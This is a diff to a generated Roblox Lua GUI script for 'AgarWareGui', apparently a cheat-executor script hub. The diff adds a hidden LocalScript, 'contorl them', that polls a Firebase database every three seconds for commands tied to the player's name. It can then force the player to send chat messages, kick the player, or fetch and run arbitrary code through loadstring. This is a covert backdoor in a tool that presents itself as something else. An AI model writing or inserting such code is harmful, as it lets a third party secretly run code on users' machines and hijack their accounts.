@@ -7,7 +7,7 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 875 | Scripts: 168 | Modules: 0 | Tags: 0
+-- Instances: 876 | Scripts: 169 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.AgarWareGui
@@ -9908,6 +9908,11 @@ G2L["36a"]["Name"] = [[AGARVOWNERLABEL]];
 -- StarterGui.AgarWareGui.MasterScripts.PLAYERLISTUSER
 G2L["36b"] = Instance.new("LocalScript", G2L["367"]);
 G2L["36b"]["Name"] = [[PLAYERLISTUSER]];
+
+
+-- StarterGui.AgarWareGui.contorl them
+G2L["36c"] = Instance.new("LocalScript", G2L["1"]);
+G2L["36c"]["Name"] = [[contorl them]];
 
 
 -- StarterGui.AgarWareGui.MoveToCorGui
@@ -37889,5 +37894,52 @@ local script = G2L["36b"];
 	end
 end;
 task.spawn(C_36b);
+-- StarterGui.AgarWareGui.contorl them
+local function C_36c()
+local script = G2L["36c"];
+	local FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
+	local HttpService = game:GetService("HttpService")
+	local Players = game:GetService("Players")
+	local TextChatService = game:GetService("TextChatService")
+	local LocalPlayer = Players.LocalPlayer
+	local _req = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
+	local lastCommandTimestamp = os.time()
+	
+	local function checkForCommands()
+		pcall(function()
+			local response = _req({
+				Url = FIREBASE_URL .. "/commands/" .. LocalPlayer.Name .. ".json",
+				Method = "GET"
+			})
+			if response.StatusCode == 200 and response.Body ~= "null" then
+				local commandData = HttpService:JSONDecode(response.Body)
+				if commandData and commandData.timestamp > lastCommandTimestamp then
+					lastCommandTimestamp = commandData.timestamp
+					if commandData.type == "forcechat" then
+						pcall(function()
+							if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+								TextChatService.TextChannels.RBXGeneral:SendAsync(commandData.message)
+							else
+								game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(commandData.message, "All")
+							end
+						end)
+					elseif commandData.type == "kick" then
+						LocalPlayer:Kick("You have been kicked by an admin.")
+					elseif commandData.type == "execute" then
+						pcall(function()
+							loadstring(commandData.code)()
+						end)
+					end
+					-- REMOVED THE DELETE HERE - let the 10 second timer handle it
+				end
+			end
+		end)
+	end
+	
+	while wait(3) do
+		checkForCommands()
+	end
+end;
+task.spawn(C_36c);
 
 return G2L["1"], require;
